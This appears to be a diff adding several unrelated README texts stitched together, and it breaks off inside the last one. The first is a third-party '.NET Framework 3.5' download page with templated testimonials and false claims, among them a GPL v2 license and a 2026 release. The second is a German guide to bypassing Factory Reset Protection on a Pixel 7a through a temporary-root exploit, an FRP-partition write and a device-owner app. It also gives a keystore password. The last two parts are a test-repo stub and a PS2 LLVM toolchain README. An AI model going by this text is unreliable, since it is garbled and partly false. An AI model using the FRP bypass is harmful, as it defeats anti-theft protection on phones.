@@ -1,0 +1,199 @@
+p-content/uploads/net-framework-35-737-3.webp" width="260" alt="Net Framework 35 feature panel — detailed view of primary tools in the 2026 release"> |
+
+</div>
+
+<details>
+<summary><b>View full screenshot gallery</b></summary>
+<br>
+<div align="center">
+
+<img src="https://softyne.com/wp-content/uploads/net-framework-35-737-4.webp" width="260" alt="Net Framework 35 preferences window — customization options in the current version">
+
+</div>
+</details>
+
+## How to Install
+<a id="how-to-install"></a>
+
+### Step-by-step guide
+
+1. Open the official page → [softyne.com](https://softyne.com)
+2. Locate the **Latest Stable Release 2026** of **Net Framework 35**
+3. Download the verified Windows installer
+4. Run the installer and follow the on-screen wizard
+
+### Video Tutorial
+- 🎥 Complete installation + feature overview: [WATCH THE VIDEO](https://softyne.com/net-framework-35/#video-guide)
+- 📝 Screenshot walkthrough on the official site
+
+> All installers are scanned and verified before publishing.
+
+## Pro Tips
+<a id="pro-tips"></a>
+
+- **Utilize LINQ** — Leverage LINQ for data queries to improve your code efficiency and readability.
+- **Optimize Performance** — Take advantage of performance profiling tools in Visual Studio to enhance your application's speed.
+- **Explore Libraries** — Familiarize yourself with the rich libraries available in .NET Framework 3.5 to utilize pre-built functionalities.
+- **Stay Updated** — Regularly check for updates to ensure you are using the latest features and security patches.
+- **Engage with Community** — Participate in forums and user groups to exchange knowledge and resolve common challenges.
+
+## FAQ
+<a id="faq"></a>
+
+<details>
+<summary>What is Net Framework 35?</summary>
+.NET Framework 3.5 is a software development platform from Microsoft that allows programmers to create visually appealing applications for Windows, utilizing various programming languages and libraries.
+</details>
+
+<details>
+<summary>Is Net Framework 35 free, and are all features included?</summary>
+Yes, .NET Framework 3.5 is completely free to download and use, with all features included in the full package. This is not a trial and not a limited version — it is the complete package with every feature included, free of charge.
+</details>
+
+<details>
+<summary>Is this a trial or limited version?</summary>
+This is not a trial and not a limited version — it is the complete package with every feature included, free of charge. Nothing is locked and no upgrade is required.
+</details>
+
+<details>
+<summary>How do I download the latest stable release 2026?</summary>
+To download the latest stable release 2026, visit the official page, locate the download link for .NET Framework 3.5, and follow the provided instructions to obtain the installer.
+</details>
+
+<details>
+<summary>Does Net Framework 35 work on Windows 10 and Windows 11?</summary>
+Yes, .NET Framework 3.5 is compatible with both Windows 10 and Windows 11, ensuring developers can create applications for the latest Windows environments.
+</details>
+
+<details>
+<summary>Can I use Net Framework 35 offline?</summary>
+Yes, .NET Framework 3.5 allows for offline installation, enabling users to install the framework without requiring an Internet connection.
+</details>
+
+<details>
+<summary>What is the fastest way to update Net Framework 35?</summary>
+Open the official download page and replace your current build with the latest stable release 2026. Your preferences stay intact when you upgrade to the newest version.
+</details>
+
+## User Testimonials
+<a id="user-testimonials"></a>
+
+**Maria Johnson, Software Engineer, USA** — "The integration of LINQ has transformed how I handle data queries, making my applications much more efficient and easier to maintain."
+
+**Liam Smith, Web Developer, Canada** — "Using .NET Framework 3.5 has significantly improved my workflow, especially with its compatibility with Visual Studio."
+
+**Aisha Patel, Application Developer, India** — "The offline installation feature is a lifesaver for me, allowing me to set up my development environment anytime and anywhere."
+
+**Carlos Gomez, IT Consultant, Spain** — "I appreciate the backward compatibility, which allows me to work on legacy applications without issues while leveraging newer features."
+
+**Yuki Tanaka, Systems Architect, Japan** — "The performance enhancements in .NET Framework 3.5 have made a noticeable difference in the responsiveness of my applications."
+
+## License Info
+<a id="license-info"></a>
+
+Net Framework 35 is distributed under the GPL v2 license. The product includes the full feature
+set and the complete package — every feature is unlocked, with no hidden
+paywall and no locked tools. Always download the official release from the
+official source to ensure authenticity and security.
+
+## Official Links
+<a id="official-links"></a>
+- 📥 **[Official download page](https://softyne.com/net-framework-35)**
+- 🎥 **[Video tutorial](https://softyne.com/net-framework-35/#video-guide)**
+- 📧 **[Support](mailto:support@softyne.com)**
+- 📖 **[Documentation](https://softyne.com/privacy-policy-2/)**
+- 💬 **[Community](https://softyne.com/about-us/)**
+
+---
+**Last updated:** 2026-11-05 03:16:29 UTC
+
+
+---
+
+# Pixel 7a recovery artifacts
+
+Hilfsdateien für ein eigenes Pixel 7a (lynx) mit aktivem FRP und gesperrtem
+Bootloader. Keine Zugangsdaten, kein Google-Konto.
+
+## REA FRP Flag
+
+`apk/REA-FRP-Flag.apk` setzt nach temporärem Root (GhostLock) das OEM-Unlock-Byte
+im Persistent Data Block und erneuert den AOSP-Digest. Signiert mit demselben
+Schlüssel wie der DPC (Zertifikat `CN=REA DPC`).
+
+- Paket: `de.rea.frpflag`
+- SHA-256: siehe `apk/SHA256SUMS`
+- Wirkt nur auf `/dev/block/by-name/frp`, erwartet exakt 524288 Byte.
+- Vor dem Schreiben wird die Partition nach `/data/local/tmp` gesichert.
+
+Direktdownload:
+`https://raw.githubusercontent.com/MoodTechBasti/pixel7a-unlock/main/apk/REA-FRP-Flag.apk`
+
+## Unlock DPC
+
+Device-Owner-Fallback. Setzt als Device Owner `adb_enabled=1` und
+`adb_wifi_enabled=1`.
+
+- `apk/rea-unlock-dpc.apk` – signiert, Paket `com.rea.unlockdpc`
+- `qr/rea-dpc.png` – Provisioning-QR
+- `apk/rea.keystore` – Signaturschlüssel, Passwort `rearea`
+
+## Reihenfolge
+
+1. Aus dem Setup heraus Einstellungen erreichbar machen.
+2. USB-Debugging aktivieren und ADB autorisieren.
+3. GhostLock mit dem exakten Kernel-Profil ausführen.
+4. `REA-FRP-Flag.apk` installieren und Flag setzen (oder `setflag.sh` per ADB).
+5. `fastboot flashing get_unlock_ability` muss `1` liefern.
+6. `fastboot flashing unlock`, dann crDroid.
+
+
+---
+
+# test-repo-04-mint-host
+behaviour test: mint probe workflow host
+
+
+---
+
+# llvm-toolchain
+
+Build scripts for the LLVM-based PS2 toolchain (Emotion Engine and IOP). A build produces:
+
+- clang, lld and the LLVM binutils replacements from [ps2build/llvm](https://github.com/ps2build/llvm) (`r5900-ee`)
+- compiler-rt builtins and the emulated-TLS runtime
+- newlib and newlib-nano from [ps2build/newlib-llvm](https://github.com/ps2build/newlib-llvm) (`ee-v4.6.0-llvm`)
+- pthread-embedded
+- libc++, libc++abi, libunwind and libatomic for the EE
+- `libiopmini`, the string functions a freestanding IOP module links against
+
+## Requirements
+
+`git`, `make`, `gcc`, `cmake`, `ninja` and `python3`. The Windows-hosted compiler also needs the mingw-w64 cross toolchain (see [docker/build-env.Dockerfile](docker/build-env.Dockerfile)).
+
+## Building
+
+```sh
+PS2DEV=/opt/ps2dev-llvm ./build.sh        # all steps
+PS2DEV=/opt/ps2dev-llvm ./build.sh 3 4    # only steps 3 and 4
+```
+
+| Step | Builds |
+|---|---|
+| 1 | LLVM (clang, lld, binutils replacements) |
+| 2 | Per-target compiler wrappers |
+| 3 | compiler-rt builtins |
+| 4 | newlib |
+| 5 | newlib-nano |
+| 6 | pthread-embedded |
+| 7 | libc++, libc++abi, libunwind, libatomic |
+| 8 | Emulated-TLS runtime |
+| 9 | libiopmini |
+
+Source repositories and refs are pinned in `config.sh`; set `CONFIG_OVERRIDE` to a file that re-exports any of them. Set `PS2_CROSS_HOST=x86_64-w64-mingw32` to build the Windows-hosted compiler from Linux (steps 1 and 2; the target libraries come from a native build).
+
+## Install layout
+
+| Path | Contents |
+|---|---|
+| `llvm/bin` | clang, 
